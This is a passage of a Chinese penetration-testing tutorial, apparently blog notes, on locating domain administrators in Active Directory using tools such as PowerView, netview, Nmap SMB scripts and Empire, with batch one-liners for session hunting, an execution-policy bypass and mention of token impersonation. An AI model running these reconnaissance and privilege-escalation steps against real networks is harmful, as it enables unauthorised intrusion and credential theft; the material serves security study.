IDS、IPS、日志审计、安全网关、反病毒软件等。所以，在域网络攻击测试场景中，如果渗透测试人员获取了域内的一个支点，为了实现对域网络的整体控制，渗透测试人员就需要获取域管理员权限。</p><p>在一个域中，当计算机加入域后，会默认给域管理员组赋予本地系统管理员的权限。也就是说，在计算机添加到域中，成为域的成员主机后，系统会自动将域管理员组添加到本地系统管理员组中。因此，域管理员组的成员均可访问本地计算机，而且具备完全控制权限。</p><p>渗透测试人员通常会通过搜集域内信息，追踪域内特权用户、域管理组用户的历史登录位置、当前登录位置等。定位域内管理员的常规渠道，一是日志，二是会话。日志是指本地机器的管理员日志，可以使用脚本或 wevtutil 导出查看。会话是指域内每个机器的登录会话，可以匿名查询，无须权限，可以使用 netsess.exe 或 PowerView 等工具查询。</p><h3 id="2：常用域管理员定位工具"><a href="#2：常用域管理员定位工具" class="headerlink" title="2：常用域管理员定位工具"></a>2：常用域管理员定位工具</h3><h4 id="2-1：psloggedon-exe"><a href="#2-1：psloggedon-exe" class="headerlink" title="2.1：psloggedon.exe"></a>2.1：psloggedon.exe</h4><p>使用psloggedon.exe，可以查看本地登录的用户和通过本地计算机或远程计算机资源登录的用户。如果指定的是用户名而不是计算机名，psloggedon.exe会搜索网上邻居中的计算机，并显示该用户当前是否登录。其原理就是通过检查注册表 HKEY_USERS 项的 key 值来查询谁登录过（需要调用NetSessionEnum API），但某些功能需要管理员权限才能使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用语法：</span><br><span class="line">-：显示支持的选项和用于输出值的单位。</span><br><span class="line">-l：仅显示本地登录，不显示本地和网络资源登录。</span><br><span class="line">-x：不显示登录时间。 </span><br><span class="line">\\computername：指定要列出登录信息的计算机的名称。 </span><br><span class="line">Username：指定用户名，在网络中搜索该用户登录的计算机。</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1678.png" alt="图片"></p><h4 id="2-2：PVEFindADUser-exe"><a href="#2-2：PVEFindADUser-exe" class="headerlink" title="2.2：PVEFindADUser.exe"></a>2.2：PVEFindADUser.exe</h4><p>PVEFindADUser.exe这款工具可用于查找活动目录用户登录的位置、枚举域用户，以及查找在特定计算机上登陆的用户，包括本地用户、通过RDP登陆的用户、用于运行服务和计划任务的用户。运行该工具的计算机需要配置 .NET Framework 2.0 环境，并且需要具有管理员权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">使用语法：</span><br><span class="line">pveFindADUser.exe &lt;参数&gt;</span><br><span class="line">-h：显示帮助。</span><br><span class="line">-u：检查是否有更新版本的实用程序。</span><br><span class="line">-current [&#x27;&#x27;username&#x27;&#x27;]：如果仅指定了-current 参数，将获取所有目标计算机上当前登录的所有用户。如果指定了用户名（DOMAIN\Username），则显示该用户登录的计算机。</span><br><span class="line">-last [&#x27;&#x27;username&#x27;&#x27;]：如果仅指定了-last 参数，将获取目标计算机上的最后一个登录用户。如果指定了用户名（DOMAIN\Username），则显示具有此用户账户作为上次登录的计算机。根据网络的策略，可能会隐藏最后一个登录用户名，且该工具可能无法得到该用户名。  -noping：阻止该工具在尝试获取用户登录信息之前对目标计算机执行 ping 命令。</span><br><span class="line">-target：可选参数，用于指定要查询的主机。如果未指定此参数，将查询当前域中的所有主机。如果指定此参数，则后跟一个由逗号分隔的主机名列表。</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1679.png" alt="图片"></p><h4 id="2-3：netview-exe"><a href="#2-3：netview-exe" class="headerlink" title="2.3：netview.exe"></a>2.3：netview.exe</h4><p>netview.exe 是一个枚举工具，使用 WinAPI 枚举系统，利用NetSessionEnum找寻登陆会话，利用NetShareEnum找寻共享，利用NetWkstaUserEnum枚举登陆的用户。同时，netview.exe 能够查询共享入口和有价值的用户。netview.exe的绝大部分功能不需要管理员权限就可以使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">使用语法：</span><br><span class="line">netview.exe &lt;参数&gt;</span><br><span class="line">-h：显示帮助菜单。</span><br><span class="line">-f filename.txt：指定从中提取主机列表的文件。 </span><br><span class="line">-e filename.txt：指定要排除的主机名文件。 </span><br><span class="line">-o filename.txt：将所有输出重定向到文件。</span><br><span class="line">-d domain：指定从中提取主机列表的域。如果没有指定，则使用当前域。 </span><br><span class="line">-g group：指定用户搜寻的组名。如果没有指定，则使用 Domain Admins。 </span><br><span class="line"> -c：检查对已找到共享的访问权限。</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1680.png" alt="图片"></p><h4 id="2-4：Nmap的NSE脚本"><a href="#2-4：Nmap的NSE脚本" class="headerlink" title="2.4：Nmap的NSE脚本"></a>2.4：Nmap的NSE脚本</h4><p>如果有域账户或者本地账户，就可以使用 Nmap 的 smb-enum-sessions.nse 引擎来获取远程机器的登录会话，并且不需要管理员权限。smb-enum-sessions.nse 的下载地址为：<a href="https://nmap.org/nsedoc/scripts/smb-enum-sessions.html%E3%80%82">https://nmap.org/nsedoc/scripts/smb-enum-sessions.html。</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">smb-enum-domains.nse：对域控制器进行信息收集，可以获取主机信息、用户、密码策略可</span><br><span class="line">以使用的用户等。</span><br><span class="line">smb-enum-users.nse：在进行域渗透测试的时候，如果获取了域内某台主机的权限，但是权限有限，不能获取更多的域用户信息，就可以借助这个脚本对域控制器进行扫描。</span><br><span class="line">smb-enum-shares.nse：遍历远程主机的共享目录。 </span><br><span class="line">smb-enum-processes.nse：对主机的系统进程进行遍历。通过这些信息，可以知道目标主机上运行软件信息，选择合适的漏洞或者规避防火墙及杀毒软件。</span><br><span class="line">smb-enum-sessions.nse：获取域内主机的用户登录会话，查看当前是否有用户登录。</span><br><span class="line">smb-os-discovery.nse：收集目标主机的操作系统、计算机名、域名、全称域名、域林名称、NetBIOS 机器名、NetBIOS 域名、工作组、系统时间。</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1681.png" alt="图片"></p><h4 id="2-5：PowerView脚本"><a href="#2-5：PowerView脚本" class="headerlink" title="2.5：PowerView脚本"></a>2.5：PowerView脚本</h4><p>PowerView是一款powershell脚本，提供了辅助定位关键用户的功能。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Invoke-StealthUserHunter ：只需要一次查询，就可以获取域内的所有用户。从user.HomeDirectories 中提取所有用户，并对每个服务器进行 Get-NetSessions 获取。因为不需要使用 Invoke-UserHunter 对每台机器进行操作，所以这个方法的隐蔽性相对较高，但涉及的机器面不一定完整。默认使用 Invoke-StealthUserHunter，如果找不到需要的信息，就接着使用 Invoke-UserHunter 方法。</span><br><span class="line"></span><br><span class="line">Invoke-UserHunter：找到域内特定的用户群。它接收用户名、用户列表或域组查询，并接收一个主机列表或查询可用的主机域名。它会使用 Get-NetSessions 和 Get-NetLoggedon（调用 NetSessionEnum 和 NetWkstaUserEnum API）扫描每个服务器，而且会比较结果，筛选出目标用户集。使用这个工具是不需要管理员权限的。在本地绕过执行该脚本。</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1682.png" alt="图片"></p><h4 id="2-6：Empire下的user-hunter模块"><a href="#2-6：Empire下的user-hunter模块" class="headerlink" title="2.6：Empire下的user_hunter模块"></a>2.6：Empire下的user_hunter模块</h4><p>在 Empire 下也存在类似 Invoke-UserHunter 的模块——user_hunter，这个模块就是用来查找域管理员登录的机器的。</p><p>使用 <code>usemodule situational_awareness/network/powerview/user_hunter</code> 模块可以清楚地看到哪个用户登录了哪台主机。在这里，显示域管理员曾经登录了机器名为 WIN7-64.shuteer.testlab、IP 地址为 192.168.31.251 的机器。</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1683.png" alt="图片"></p><h2 id="2-11-查找域管理进程"><a href="#2-11-查找域管理进程" class="headerlink" title="2.11 查找域管理进程"></a>2.11 查找域管理进程</h2><p>一个典型的域权限提升过程通常围绕着收集明文凭据或者通过 Mimikatz 来获得提升的权限等方法，然后在其所获取管理员权限的系统中寻找域管理员登录进程，从而收集域管理员的凭据。</p><p>我们来看一种假设的情况：渗透测试人员在某个内网环境中获得了一个域普通用户的权限，首先通过各种方法获得当前服务器的本地管理员权限，然后分析当前服务器的用户登录列表及会话信息，找出有哪些用户登录了这台服务器上。如果渗透测试人员通过分析发现，可以获取权限的登录用户都不是域管理员账户，同时也没有域管理员组的用户登录这台服务器，那么他会选择另一个账户，继续寻找这个账户在内网哪个机器上具有管理权限，再枚举这台机器上的登录用户，并继续进行渗透测试，直至找到一个有效的路径可以获取到域管理员权限为止。在具有成千上万台计算机和用户的环境中，该过程可能需要几天甚至几周的时间。</p><h3 id="1：本机检查"><a href="#1：本机检查" class="headerlink" title="1：本机检查"></a>1：本机检查</h3><h4 id="1-1：获取域管理员列表"><a href="#1-1：获取域管理员列表" class="headerlink" title="1.1：获取域管理员列表"></a>1.1：获取域管理员列表</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Admins&quot; /domain</span><br></pre></td></tr></table></figure><p>当前有一个域管理员：administrator</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1684.png" alt="图片"></p><h4 id="1-2：列出本机所有进程及进程用户"><a href="#1-2：列出本机所有进程及进程用户" class="headerlink" title="1.2：列出本机所有进程及进程用户"></a>1.2：列出本机所有进程及进程用户</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /v</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1685.png" alt="图片"></p><h4 id="1-3：寻找进程所有者为域管理员的进程"><a href="#1-3：寻找进程所有者为域管理员的进程" class="headerlink" title="1.3：寻找进程所有者为域管理员的进程"></a>1.3：寻找进程所有者为域管理员的进程</h4><p>通过以上操作可以看出，当前存在域管理员进程，这种方法只是有几率能查找到域管理员进程，在实际情况下往往并非如此。</p><h3 id="2：查询域控制器的域用户会话"><a href="#2：查询域控制器的域用户会话" class="headerlink" title="2：查询域控制器的域用户会话"></a>2：查询域控制器的域用户会话</h3><p>查询域控制器的域用户会话，其原理是：在域控制器中查询域用户会话列表，并将其与域管理员列表进行交叉引用，从而得到域管理员会话的系统列表。</p><h4 id="2-1：查询域控制器列表"><a href="#2-1：查询域控制器列表" class="headerlink" title="2.1：查询域控制器列表"></a>2.1：查询域控制器列表</h4><p>可以使用LDAP查询从Domain Controlles单元中收集的域控制器列表。也可以使用net命令查询域控制器列表。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Controllers&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1686.png" alt="图片"></p><h4 id="2-2：收集域管理员列表"><a href="#2-2：收集域管理员列表" class="headerlink" title="2.2：收集域管理员列表"></a>2.2：收集域管理员列表</h4><p>可以使用LDAP进行查询。也可以使用net命令，从域管理员组中收集域管理员列表。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Admins&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1687.png" alt="图片"></p><h4 id="2-3：收集所有活动域的会话列表"><a href="#2-3：收集所有活动域的会话列表" class="headerlink" title="2.3：收集所有活动域的会话列表"></a>2.3：收集所有活动域的会话列表</h4><p>使用netsess.exe查询每个域控制器，收集所有活动域会话列表。netsess.exe它包含本地Windows函数netsessionenum。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsess.exe -h</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1688.png" alt="图片"></p><h4 id="2-4：交叉引用域管理员列表与活动会话列表"><a href="#2-4：交叉引用域管理员列表与活动会话列表" class="headerlink" title="2.4：交叉引用域管理员列表与活动会话列表"></a>2.4：交叉引用域管理员列表与活动会话列表</h4><p>对域管理员列表和活动会话列表进行交叉引用，可以确定哪些IP地址有活动域令牌。也可以通过下列脚本快速使用netsess.exe的Windows命令行。</p><p>将域控制器列表添加到dcs.txt中，将域管理员列表添加到admins.txt中，并与netsess.exe放在同一目录下，运行脚本会在当前目录下生成一个文本文件sessions.txt：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FOR /F %i in (dcs.txt) do @echo [+] Querying DC %i &amp;&amp; @netsess -h %i 2&gt;nul &gt; sessions.txt &amp;&amp; FOR /F %a in (admins.txt) DO @type sessions.txt | @findstr /I %a</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1689.png" alt="图片"></p><h3 id="3：查询远程系统中运行的任务"><a href="#3：查询远程系统中运行的任务" class="headerlink" title="3：查询远程系统中运行的任务"></a>3：查询远程系统中运行的任务</h3><p>如果目标机器在域系统中是通过共享的本地管理员账户运行的，就可以使用下列脚本来查询系统中的域管理员任务。</p><p>首先，从Domain Admins组中收集域管理员列表：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Admins&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1690.png" alt="图片"></p><p>然后运行如下脚本，将目标域系统列表添加到ips.txt文件中，将收集的域管理员列表添加到names.txt文件中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FOR /F %i in (ips.txt) DO @echo [+] %i &amp;&amp; @tasklist /V /S %i /U user /P password 2&gt;NUL &gt; output.txt &amp;&amp; FOR /F %n in (names.txt) DO @type output.txt | findstr %n &gt; NUL &amp;&amp; echo [!] %n was found running a process on %i &amp;&amp; pause</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1691.png" alt="图片"></p><h3 id="4：扫描远程系统的NetBIOS信息"><a href="#4：扫描远程系统的NetBIOS信息" class="headerlink" title="4：扫描远程系统的NetBIOS信息"></a>4：扫描远程系统的NetBIOS信息</h3><p>某些版本的Windows操作系统允许用户通过NetBIOS查询已登录用户，下面这个Windows命令行脚本就用于扫描远程系统活跃域中的管理会话。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for /F %i in (ips.txt) do @echo [+] Checking %i &amp;&amp; nbtstat -A %i 2&gt;NUL &gt;nbsessions.txt &amp;&amp; FOR /F %n in (admins.txt) DO @type nbsessions.txt | findstr /I %n &gt; NUL &amp;&amp; echo [!] %n was found logged into %i</span><br></pre></td></tr></table></figure><p>同样，吧目标域系统列表添加到ips.txt文件中，将收集的域管理员列表添加到admins.txt文件中，同目录运行脚本：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1692.png" alt="图片"></p><h2 id="2-12-域管理员模拟方法简介"><a href="#2-12-域管理员模拟方法简介" class="headerlink" title="2.12 域管理员模拟方法简介"></a>2.12 域管理员模拟方法简介</h2><p>如果您已经有一个 meterpreter 会话，您可以使用 Incognito模拟域管理员，或添加一个新的域 管理员。通过尝试遍历系统中所有可用的授权令牌来随意添加新的管理员。</p><h2 id="2-13-利用PowerShell收集域信息"><a href="#2-13-利用PowerShell收集域信息" class="headerlink" title="2.13 利用PowerShell收集域信息"></a>2.13 利用PowerShell收集域信息</h2><p>PowerShell可以理解为增强版的”cmd.exe”，打开方式就是：运行-&gt;输入powershell：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1693.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1694.png" alt="图片"></p><p>如果想执行一个Powershell脚本，需要修改Powershell的默认权限为执行权限。PowerShell常用的执行权限有四种：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Restricted：默认设置，不允许执行任何脚本。</span><br><span class="line">Allsigned：只能运行经过证书验证的脚本。</span><br><span class="line">Unrestricted：权限最高，可以执行任意脚本。</span><br><span class="line">RemoteSigned：本地脚本无限制，但是对来自网络的脚本必须经过签名。 </span><br></pre></td></tr></table></figure><p>在PowerShell中输入Get-ExecutionPolicy，可以查看权限：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1695.png" alt="图片"></p><p>如果想要修改权限就可以执行这条命令，然后选择Y：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy 权限名</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1696.png" alt="图片"></p><h3 id="powerview"><a href="#powerview" class="headerlink" title="powerview"></a>powerview</h3><p>powerview这个脚本是一款依赖于 powershell 和 WMI 对内网进行查询的常用渗透测试脚本。</p><p>下载地址：<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a></p><p>导入脚本 powerview.ps1：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import-module .\powerview.ps1</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1697.png" alt="图片"></p><h4 id="Powerview中常用的命令"><a href="#Powerview中常用的命令" class="headerlink" title="Powerview中常用的命令"></a>Powerview中常用的命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Get-NetDomain：获取当前用户所在的域名称。 </span><br><span class="line">Get-NetUser：返回所有用户的详细信息。 </span><br><span class="line">Get-NetDomainController：获取所有域控制器。 </span><br><span class="line">Get-NetComputer：获取所有域内机器的详细信息。 </span><br><span class="line">Get-NetOU：获取域中的 OU 信息。</span><br><span class="line">Get-NetGroup：获取所有域内组和组成员信息。 </span><br><span class="line">Get-NetFileServer：根据 SPN 获取当前域使用的文件服务器。 </span><br><span class="line">Get-NetShare：获取当前域内所有网络共享。 </span><br><span class="line">Get-NetSession：获取在指定服务器存在的会话信息。</span><br><span class="line">Get-NetRDPSession：获取在指定服务器存在的远程连接信息。</span><br><span class="line">Get-NetProcess：获取远程主机的进程信息。</span><br><span class="line">Get-UserEvent：获取指定用户的日志信息。 </span><br><span class="line">Get-ADObject：获取活动目录的对象信息。 </span><br><span class="line">Get-NetGPO：获取域所有组策略对象。 </span><br><span class="line">Get-DomainPolicy：获取域默认或域控制器策略。 </span><br><span class="line">Invoke-UserHunter：用于获取域用户登录计算机及该用户是否有本地管理权限。 </span><br><span class="line">Invoke-ProcessHunter：查找域内所有机器进程用于找到某特定用户。</span><br><span class="line">Invoke-UserEventHunter：根据用户日志获取某域用户登录过哪些域机器。 </span><br></pre></td></tr></table></figure><h4 id="获取当前用户所在的域名称"><a href="#获取当前用户所在的域名称" class="headerlink" title="获取当前用户所在的域名称"></a>获取当前用户所在的域名称</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetDomain</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1698.png" alt="图片"></p><h4 id="返回所有用户的详细信息"><a href="#返回所有用户的详细信息" class="headerlink" title="返回所有用户的详细信息"></a>返回所有用户的详细信息</h4><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1699.png" alt="图片"></p><h4 id="获取所有域控制器"><a href="#获取所有域控制器" class="headerlink" title="获取所有域控制器"></a>获取所有域控制器</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetDomainController</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1700.png" alt="图片"></p><h4 id="获取所有域内机器的详细信息"><a href="#获取所有域内机器的详细信息" class="headerlink" title="获取所有域内机器的详细信息"></a>获取所有域内机器的详细信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetComputer</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1701.png" alt="图片"></p><h4 id="获取域中的-OU-信息"><a href="#获取域中的-OU-信息" class="headerlink" title="获取域中的 OU 信息"></a>获取域中的 OU 信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetOU</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1702.png" alt="图片"></p><h4 id="获取所有域内组和组成员信息"><a href="#获取所有域内组和组成员信息" class="headerlink" title="获取所有域内组和组成员信息"></a>获取所有域内组和组成员信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetGroup</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1703.png" alt="图片"></p><h4 id="根据-SPN-获取当前域使用的文件服务器"><a href="#根据-SPN-获取当前域使用的文件服务器" class="headerlink" title="根据 SPN 获取当前域使用的文件服务器"></a>根据 SPN 获取当前域使用的文件服务器</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetFileServer</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1704.png" alt="图片"></p><h4 id="获取当前域内所有网络共享"><a href="#获取当前域内所有网络共享" class="headerlink" title="获取当前域内所有网络共享"></a>获取当前域内所有网络共享</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetShare</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1705.png" alt="图片"></p><h4 id="获取在指定服务器存在的会话信息"><a href="#获取在指定服务器存在的会话信息" class="headerlink" title="获取在指定服务器存在的会话信息"></a>获取在指定服务器存在的会话信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetSession</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1706.png" alt="图片"></p><h4 id="获取在指定服务器存在的远程连接信息"><a href="#获取在指定服务器存在的远程连接信息" class="headerlink" title="获取在指定服务器存在的远程连接信息"></a>获取在指定服务器存在的远程连接信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetRDPSession</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1707.png" alt="图片"></p><h4 id="获取远程主机的进程信息"><a href="#获取远程主机的进程信息" class="headerlink" title="获取远程主机的进程信息"></a>获取远程主机的进程信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetProcess</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1708.png" alt="图片"></p><h4 id="获取指定用户的日志信息"><a href="#获取指定用户的日志信息" class="headerlink" title="获取指定用户的日志信息"></a>获取指定用户的日志信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-UserEvent</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1709.png" alt="图片"></p><h4 id="获取活动目录的对象信息"><a href="#获取活动目录的对象信息" class="headerlink" title="获取活动目录的对象信息"></a>获取活动目录的对象信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ADObject</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1710.png" alt="图片"></p><h4 id="获取域所有组策略对象"><a href="#获取域所有组策略对象" class="headerlink" title="获取域所有组策略对象"></a>获取域所有组策略对象</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetGPO</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1711.png" alt="图片"></p><h4 id="获取域默认或域控制器策略"><a href="#获取域默认或域控制器策略" class="headerlink" title="获取域默认或域控制器策略"></a>获取域默认或域控制器策略</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainPolicy</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1712.png" alt="图片"></p><h4 id="用于获取域用户登录计算机及该用户是否有本地管理权限"><a href="#用于获取域用户登录计算机及该用户是否有本地管理权限" class="headerlink" title="用于获取域用户登录计算机及该用户是否有本地管理权限"></a>用于获取域用户登录计算机及该用户是否有本地管理权限</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-UserHunter</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1713.png" alt="图片"></p><h4 id="查找域内所有机器进程用于找到某特定用户"><a href="#查找域内所有机器进程用于找到某特定用户" class="headerlink" title="查找域内所有机器进程用于找到某特定用户"></a>查找域内所有机器进程用于找到某特定用户</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-ProcessHunter</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1714.png" alt="图片"></p><h4 id="根据用户日志获取某域用户登录过哪些域机器"><a href="#根据用户日志获取某域用户登录过哪些域机器" class="headerlink" title="根据用户日志获取某域用户登录过哪些域机器"></a>根据用户日志获取某域用户登录过哪些域机器</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-UserEventHunter</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1715.png" alt="图片"></p><h3 id="CMD运行powershell"><a href="#CMD运行powershell" class="headerlink" title="CMD运行powershell"></a>CMD运行powershell</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -exec bypass &quot;import-module c:\powerview.ps1;get-netuser&quot;</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1716.png" alt="图片"></p><h2 id="2-14-域渗透分析工具bloodhound的使用"><a href="#2-14-域渗透分析工具bloodhound的使用" class="headerlink" title="2.14 域渗透分析工具bloodhound的使用"></a>2.14 域渗透分析工具bloodhound的使用</h2><p>安装BloodHound所需环境</p><h3 id="1、下载安装JDK"><a href="#1、下载安装JDK" class="headerlink" title="1、下载安装JDK"></a>1、下载安装JDK</h3><p>JDK8下载地址：<a href="https://www.oracle.com/java/technologies/javase-jdk8-downloads.html">https://www.oracle.com/java/technologies/javase-jdk8-downloads.html</a></p><h3 id="2、下载安装Neo4j"><a href="#2、下载安装Neo4j" class="headerlink" title="2、下载安装Neo4j"></a>2、下载安装Neo4j</h3><p>下载地址：<a 